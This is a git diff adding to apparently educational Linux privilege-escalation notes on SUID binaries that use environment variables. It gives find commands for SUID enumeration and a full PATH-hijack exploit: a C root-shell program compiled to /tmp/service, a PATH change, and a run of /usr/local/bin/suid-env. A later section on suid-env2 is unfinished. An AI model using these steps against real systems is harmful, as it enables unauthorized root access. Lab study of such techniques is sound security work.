@@ -66,5 +66,22 @@ void inject() {
 
 ### Enumeration 
 
-- `find / -type f -perm -04000 -ls 2>/dev/null` we can then chek for env var with the suid bit activated in our example we have `/usr/local/bin/suid-env` this launches apache using service (we know this by making a strings on the file).
- **COMING SOON**
+- `find / -type f -perm -04000 -ls 2>/dev/null` we can then chek for env var with the suid bit activated in our example we have `/usr/local/bin/suid-env` this launches apache using service (we know this by making a strings on the file).  
+![image](https://user-images.githubusercontent.com/96747355/170258997-532e61be-117c-4e9f-9ad9-a4e6c0644716.png)  
+
+### Exploitation
+
+- Let's create a malicious service and add it to our path so that it is launched instead of apache
+- `echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c`
+- `gcc /tmp/service.c -o /tmp/service`
+- We now need to change our path `export PATH=/tmp:$PATH`  
+![image](https://user-images.githubusercontent.com/96747355/170260619-089f2ad9-71ae-4dea-8283-a40ddbb0e5a7.png)  
+- And now we just need to run the binary `/usr/local/bin/suid-env` to escalate to root  
+![image](https://user-images.githubusercontent.com/96747355/170260873-6b5fa24d-658b-4ba2-b2a1-f2662a4ba839.png)  
+
+## SUID - Environmental Variables with full path to binary
+
+- `find / -type f -perm -04000 -ls 2>/dev/null` we can then chek for env var with the suid bit activated in our example we have `/usr/local/bin/suid-env2` this launches apache using its full path service (we know this by making a strings on the file).  
+![image](https://user-images.githubusercontent.com/96747355/170265161-6ffb4183-13e3-418f-8317-5fb8ba1c1faf.png)  
+**COMING SOON**
+
